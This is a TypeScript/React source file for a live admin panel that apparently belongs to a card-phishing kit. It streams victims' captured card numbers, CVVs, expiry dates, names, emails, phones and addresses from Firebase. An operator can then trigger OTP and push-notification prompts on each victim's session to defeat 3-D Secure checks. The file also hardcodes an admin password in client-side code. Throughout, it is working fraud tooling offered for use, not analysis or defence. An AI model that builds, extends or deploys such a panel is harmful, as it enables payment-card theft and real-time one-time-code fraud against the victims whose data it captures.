"use client";

import { useEffect, useState, useRef } from "react";
import { useParams } from "next/navigation";
import { db as database } from "@/lib/firebase";
import { ref, onValue, push, set } from "firebase/database";
import {
    Activity,
    CreditCard,
    Globe,
    MapPin,
    MessageSquare,
    Monitor,
    Shield,
    Smartphone,
    Terminal,
    Clock,
    Wifi,
    Lock,
    Eye,
    EyeOff
} from "lucide-react";
import CardVisual from "@/components/CardVisual";

interface LogEntry {
    id: string;
    type: "info" | "input" | "otp" | "error" | "success";
    message: string;
    timestamp: number;
}

interface SessionData {
    id: string;
    ip: string;
    ua: string;
    device: string;
    card?: string;
    name?: string;
    cvv?: string;
    expiry?: string;
    email?: string;
    phone?: string;
    address?: string;
    city?: string;
    state?: string;
    zip?: string;
    delivery?: string;
    status: "active" | "success" | "failed";
    lastActive: number;
    currentLocation?: string;
    logs?: Record<string, LogEntry>; // Firebase returns objects for lists usually
}

// Helper to convert logs object to array
const getLogsArray = (logs?: Record<string, LogEntry>): LogEntry[] => {
    if (!logs) return [];
    return Object.values(logs).sort((a, b) => a.timestamp - b.timestamp);
};

export default function LivePanel() {
    const params = useParams();
    const projectId = params.projectId as string;
    const [sessions, setSessions] = useState<Record<string, SessionData>>({});
    const [selectedSessionId, setSelectedSessionId] = useState<string | null>(null);
    const chatEndRef = useRef<HTMLDivElement>(null);

    // Login State
    const [isLoggedIn, setIsLoggedIn] = useState(false);
    const [passwordInput, setPasswordInput] = useState("");
    const [loginError, setLoginError] = useState(false);
    const [showPassword, setShowPassword] = useState(false);

    // 1. Handle Login Persistence & Auth
    useEffect(() => {
        const storedAuth = localStorage.getItem("admin_auth_timestamp");
        if (storedAuth) {
            const lastActive = parseInt(storedAuth);
            const now = Date.now();
            // 15 minutes expiration (15 * 60 * 1000 = 900000)
            if (now - lastActive < 900000) {
                setIsLoggedIn(true);
                // Refresh timestamp
                localStorage.setItem("admin_auth_timestamp", now.toString());
            } else {
                localStorage.removeItem("admin_auth_timestamp");
            }
        }
    }, []);

    const handleLogin = (e: React.FormEvent) => {
        e.preventDefault();
        if (passwordInput === "Tatta@1337") {
            setIsLoggedIn(true);
            setLoginError(false);
            localStorage.setItem("admin_auth_timestamp", Date.now().toString());
        } else {
            setLoginError(true);
            setPasswordInput("");
        }
    };

    // 2. Firebase Listener (Only if logged in)
    useEffect(() => {
        if (!projectId || !isLoggedIn) return;

        const sessionsRef = ref(database, `projects/${projectId}/sessions`);
        const unsubscribe = onValue(sessionsRef, (snapshot) => {
            const data = snapshot.val();
            if (data) {
                setSessions(data);
                // Auto-select first session if none selected
                if (!selectedSessionId) {
                    const ids = Object.keys(data);
                    if (ids.length > 0) setSelectedSessionId(ids[0]);
                }
            } else {
                setSessions({});
            }
        });

        return () => unsubscribe();
    }, [projectId, isLoggedIn, selectedSessionId]);

    // 3. Auto-scroll chat
    const selectedSession = selectedSessionId ? sessions[selectedSessionId] : null;
    const logs = selectedSession ? getLogsArray(selectedSession.logs) : [];

    useEffect(() => {
        chatEndRef.current?.scrollIntoView({ behavior: "smooth" });
    }, [logs]);

    // 4. Send Command
    const sendCommand = (cmd: string) => {
        if (!selectedSessionId || !projectId) return;

        // Push command to session
        const commandRef = ref(database, `projects/${projectId}/sessions/${selectedSessionId}/command`);
        set(commandRef, {
            type: cmd,
            timestamp: Date.now()
        });

        // Log it locally for the admin to see
        const logsRef = ref(database, `projects/${projectId}/sessions/${selectedSessionId}/logs`);
        const newLogRef = push(logsRef);
        set(newLogRef, {
            id: newLogRef.key,
            type: "info",
            message: `Admin sent command: ${cmd}`,
            timestamp: Date.now()
        });
    };

    // --- RENDER LOGIN SCREEN ---
    if (!isLoggedIn) {
        return (
            <div className="min-h-screen bg-[#0b0e14] flex items-center justify-center p-4">
                <div className="w-full max-w-md bg-[#11141d] border border-white/5 rounded-2xl shadow-2xl p-8">
                    <div className="flex flex-col items-center mb-8">
                        <div className="w-16 h-16 bg-blue-600/20 rounded-full flex items-center justify-center mb-4 text-blue-500">
                            <Lock className="w-8 h-8" />
                        </div>
                        <h1 className="text-2xl font-bold text-white tracking-tight">Admin Access</h1>
                        <p className="text-gray-500 text-sm mt-2">Restricted area. Authorized personnel only.</p>
                    </div>

                    <form onSubmit={handleLogin} className="space-y-6">
                        <div className="space-y-2">
                            <label className="text-xs font-bold text-gray-500 uppercase tracking-wider">Password</label>
                            <div className="relative">
                                <input
                                    type={showPassword ? "text" : "password"}
                                    value={passwordInput}
                                    onChange={(e) => setPasswordInput(e.target.value)}
                                    className="w-full bg-[#0b0e14] border border-white/10 rounded-lg px-4 py-3 text-white focus:outline-none focus:border-blue-500 transition-colors pr-10"
                                    placeholder="Enter access code..."
                                />
                                <button
                                    type="button"
                                    onClick={() => setShowPassword(!showPassword)}
                                    className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-500 hover:text-gray-300"
                                >
                                    {showPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                                </button>
                            </div>
                            {loginError && (
                                <p className="text-red-500 text-xs mt-1 animate-pulse">Access denied. Invalid credentials.</p>
                            )}
                        </div>

                        <button
                            type="submit"
                            className="w-full bg-blue-600 hover:bg-blue-500 text-white font-bold py-3 rounded-lg transition-all transform active:scale-95 shadow-lg shadow-blue-900/20"
                        >
                            Unlock Dashboard
                        </button>
                    </form>

                    <div className="mt-8 text-center">
                        <p className="text-[10px] text-gray-600 uppercase tracking-widest">
                            Secure Terminal v2.0.4
                        </p>
                    </div>
                </div>
            </div>
        );
    }

    // --- RENDER DASHBOARD ---
    // Always render the layout, handle empty session inside fields
    return (
        <div className="flex h-screen bg-[#0b0e14] text-white font-sans overflow-hidden">

            {/* LEFT COLUMN: Browser Info & Session List */}
            <div className="w-80 bg-[#11141d] border-r border-white/5 flex flex-col">
                <div className="p-4 border-b border-white/5 bg-[#161b26]">
                    <h2 className="text-xs font-bold uppercase tracking-widest text-blue-400 flex items-center gap-2">
                        <Globe className="w-4 h-4" /> Active Sessions
                    </h2>
                </div>
                <div className="p-4 space-y-2 overflow-y-auto flex-1">
                    {/* Session List */}
                    {Object.keys(sessions).length === 0 ? (
                        <div className="text-gray-500 text-xs text-center py-4">No active users</div>
                    ) : (
                        Object.values(sessions).map(s => (
                            <div
                                key={s.id}
                                onClick={() => setSelectedSessionId(s.id)}
                                className={`p-3 rounded cursor-pointer border ${selectedSessionId === s.id ? 'bg-blue-600/10 border-blue-500/50' : 'bg-[#161b26] border-white/5 hover:border-white/10'}`}
                            >
                                <div className="flex justify-between items-center mb-1">
                                    <span className="font-mono text-xs text-blue-300">#{s.id.substring(0, 4)}</span>
                                    {s.status === 'active' && <span className="w-2 h-2 bg-green-500 rounded-full animate-pulse"></span>}
                                </div>
                                <div className="text-[10px] text-gray-500 truncate">{s.currentLocation || "Unknown"}</div>
                            </div>
                        ))
                    )}
                </div>

                {/* Browser Info (Bottom of Left Col) */}
                <div className="p-4 border-t border-white/5 bg-[#161b26] space-y-4">
                    <h3 className="text-[10px] font-bold uppercase text-gray-500">Device Info {selectedSession ? "" : "(Select Session)"}</h3>
                    {selectedSession ? (
                        <>
                            <div className="text-xs text-gray-300 truncate" title={selectedSession.ua}>{selectedSession.device}</div>
                            <div className="text-xs text-gray-400 font-mono">{selectedSession.ip || "127.0.0.1"}</div>
                        </>
                    ) : (
                        <div className="text-xs text-gray-600 italic">No session selected</div>
                    )}
                </div>
            </div>

            {/* CENTER COLUMN: Chat Box (Event Log) */}
            <div className="flex-1 flex flex-col bg-[#0b0e14] relative">
                <div className="p-4 border-b border-white/5 bg-[#11141d] flex justify-between items-center">
                    <h2 className="text-xs font-bold uppercase tracking-widest text-blue-400 flex items-center gap-2">
                        <MessageSquare className="w-4 h-4" /> Live Events
                    </h2>
                    <div className="flex items-center gap-2 text-xs">
                        <span className={`w-2 h-2 rounded-full ${selectedSession ? 'bg-green-500 animate-pulse' : 'bg-red-500'}`}></span>
                        <span className={selectedSession ? 'text-green-400' : 'text-red-400'}>{selectedSession ? 'Connected' : 'Disconnected'}</span>
                    </div>
                </div>

                {/* Chat Area */}
                <div className="flex-1 overflow-y-auto p-4 space-y-4">
                    {!selectedSession ? (
                        <div className="h-full flex flex-col items-center justify-center text-gray-600 opacity-50">
                            <Wifi className="w-8 h-8 mb-2" />
                            <p className="text-sm">Waiting for connection...</p>
                        </div>
                    ) : (
                        <>
                            {logs.map((log) => (
                                <div key={log.id} className={`flex ${log.type === 'input' ? 'justify-end' : 'justify-start'}`}>
                                    <div className={`max-w-[80%] rounded-lg p-3 text-sm ${log.type === 'input'
                                        ? 'bg-blue-600/20 border border-blue-500/30 text-blue-100'
                                        : log.type === 'otp'
                                            ? 'bg-yellow-600/20 border border-yellow-500/30 text-yellow-100'
                                            : 'bg-[#161b26] border border-white/5 text-gray-300'
                                        }`}>
                                        <div className="flex items-center gap-2 mb-1 opacity-50 text-[10px] uppercase tracking-wider">
                                            {log.type === 'input' ? <Terminal className="w-3 h-3" /> : <Shield className="w-3 h-3" />}
                                            <span>{new Date(log.timestamp).toLocaleTimeString()}</span>
                                        </div>
                                        <div>{log.message}</div>
                                    </div>
                                </div>
                            ))}
                            <div ref={chatEndRef} />
                        </>
                    )}
                </div>

                {/* Action Bar */}
                <div className="p-4 bg-[#11141d] border-t border-white/5">
                    <div className="grid grid-cols-4 gap-3">
                        <button
                            onClick={() => sendCommand("OTP")}
                            disabled={!selectedSession}
                            className="bg-blue-600/20 hover:bg-blue-600/30 disabled:opacity-50 disabled:cursor-not-allowed text-blue-400 border border-blue-500/30 py-3 rounded font-bold text-xs uppercase tracking-wider transition-all"
                        >
                            Trigger OTP
                        </button>
                        <button
                            onClick={() => sendCommand("PUSH")}
                            disabled={!selectedSession}
                            className="bg-purple-600/20 hover:bg-purple-600/30 disabled:opacity-50 disabled:cursor-not-allowed text-purple-400 border border-purple-500/30 py-3 rounded font-bold text-xs uppercase tracking-wider transition-all"
                        >
                            Push Notif
                        </button>
                        <button
                            onClick={() => sendCommand("SUCCESS")}
                            disabled={!selectedSession}
                            className="bg-green-600/20 hover:bg-green-600/30 disabled:opacity-50 disabled:cursor-not-allowed text-green-400 border border-green-500/30 py-3 rounded font-bold text-xs uppercase tracking-wider transition-all"
                        >
                            End Success
                        </button>
                        <button
                            onClick={() => sendCommand("FAIL")}
                            disabled={!selectedSession}
                            className="bg-red-600/20 hover:bg-red-600/30 disabled:opacity-50 disabled:cursor-not-allowed text-red-400 border border-red-500/30 py-3 rounded font-bold text-xs uppercase tracking-wider transition-all"
                        >
                            End Failed
                        </button>
                    </div>
                </div>
            </div>

            {/* RIGHT COLUMN: Live Mirror */}
            <div className="w-96 bg-[#11141d] border-l border-white/5 flex flex-col">
                <div className="p-4 border-b border-white/5 bg-[#161b26]">
                    <h2 className="text-xs font-bold uppercase tracking-widest text-blue-400 flex items-center gap-2">
                        <CreditCard className="w-4 h-4" /> Live Mirror
                    </h2>
                </div>

                <div className="p-6 space-y-8 overflow-y-auto flex-1">

                    {/* Card Visual */}
                    <div className="relative group">
                        <div className="absolute -inset-1 bg-gradient-to-r from-blue-600 to-purple-600 rounded-2xl blur opacity-20 group-hover:opacity-40 transition duration-1000"></div>
                        <div className="relative">
                            <CardVisual
                                cardNumber={selectedSession?.card || ""}
                                cardHolder={selectedSession?.name || ""}
                                expiry={selectedSession?.expiry || ""}
                                cvv={selectedSession?.cvv || ""}
                            />
                        </div>
                    </div>

                    {/* Captured Data Table */}
                    <div className="bg-[#0b0e14] rounded-xl border border-white/5 overflow-hidden">
                        <div className="px-4 py-3 border-b border-white/5 bg-[#161b26] flex justify-between items-center">
                            <span className="text-xs font-bold text-gray-500 uppercase">Captured Fields</span>
                            <span className="text-[10px] bg-blue-500/20 text-blue-400 px-2 py-0.5 rounded">Live</span>
                        </div>
                        <div className="divide-y divide-white/5">
                            {[
                                { label: "Email", value: selectedSession?.email },
                                { label: "Phone", value: selectedSession?.phone },
                                { label: "Name", value: selectedSession?.name },
                                { label: "Address", value: selectedSession?.address },
                                { label: "City/State", value: selectedSession ? `${selectedSession.city || ''} ${selectedSession.state || ''} ${selectedSession.zip || ''}` : '' },
                                { label: "Delivery", value: selectedSession?.delivery?.toUpperCase() },
                            ].map((item, i) => (
                                <div key={i} className="px-4 py-3 flex flex-col gap-1">
                                    <span className="text-[10px] text-gray-500 uppercase tracking-wider">{item.label}</span>
                                    <span className="text-sm text-gray-200 font-mono break-all">{item.value || "---"}</span>
                                </div>
                            ))}
                        </div>
                    </div>

                    {/* 3D Secure Preview */}
                    <div className="bg-[#0b0e14] rounded-xl border border-white/5 overflow-hidden opacity-50">
                        <div className="px-4 py-3 border-b border-white/5 bg-[#161b26]">
                            <span className="text-xs font-bold text-gray-500 uppercase">3D Secure State</span>
                        </div>
                        <div className="p-4 text-center">
                            <div className="text-xs text-gray-500 mb-2">Waiting for trigger...</div>
                            <div className="w-full h-2 bg-[#161b26] rounded-full overflow-hidden">
                                <div className="h-full bg-blue-600 w-0"></div>
                            </div>
                        </div>
                    </div>

                </div>
            </div>

        </div>
    );
}
